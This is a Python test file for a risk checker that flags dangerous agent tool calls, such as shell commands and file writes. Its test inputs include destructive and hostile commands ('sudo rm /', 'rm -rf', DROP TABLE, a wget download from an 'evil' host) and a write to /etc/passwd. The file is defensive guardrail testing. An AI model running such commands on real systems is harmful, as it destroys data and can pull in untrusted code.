"""危险动作识别测试：高风险 bash 命令、文件操作。"""
from app.worker.risk import assess_action, RiskHit


class TestAssessAction:
    def test_dangerous_command_rm_rf(self):
        hits = assess_action("execute_bash", {"command": "rm -rf /tmp/x"})
        assert len(hits) >= 1
        assert any("rm" in h.description.lower() for h in hits)

    def test_dangerous_command_sudo(self):
        hits = assess_action("execute_bash", {"command": "sudo systemctl restart"})
        assert len(hits) >= 1

    def test_dangerous_command_git_push(self):
        hits = assess_action("execute_bash", {"command": "git push origin main"})
        assert len(hits) >= 1

    def test_dangerous_command_drop_table(self):
        hits = assess_action("execute_bash", {"command": "psql -c 'DROP TABLE users'"})
        assert len(hits) >= 1
        assert any("drop" in h.description.lower() for h in hits)

    def test_pip_install_dangerous(self):
        hits = assess_action("execute_bash", {"command": "pip install -r requirements.txt"})
        assert len(hits) >= 1

    def test_pip_uninstall_dangerous(self):
        hits = assess_action("execute_bash", {"command": "pip uninstall flask"})
        assert len(hits) >= 1

    def test_network_access_dangerous(self):
        hits = assess_action("execute_bash", {"command": "curl https://example.com"})
        assert len(hits) >= 1

    def test_wget_dangerous(self):
        hits = assess_action("execute_bash", {"command": "wget -q -O /tmp/x http://evil"})
        assert len(hits) >= 1

    def test_path_traversal(self):
        hits = assess_action("write_file", {"path": "/etc/passwd", "content": "x"})
        assert len(hits) >= 1
        assert any("outside" in h.description.lower() or "directory" in h.description.lower() for h in hits)

    def test_safe_command(self):
        hits = assess_action("execute_bash", {"command": "ls"})
        assert len(hits) == 0

    def test_safe_file_write_in_workspace(self):
        hits = assess_action("write_file", {"path": "/workspace/src/test.py", "content": "x"})
        assert len(hits) == 0

    def test_many_files_changed(self):
        hits = assess_action("edit_file", changed_files_count=15)
        assert len(hits) >= 1
        assert any("file" in h.description.lower() or "too many" in h.description.lower() for h in hits)

    def test_string_args(self):
        hits = assess_action("execute_bash", "sudo rm /")
        assert len(hits) >= 1
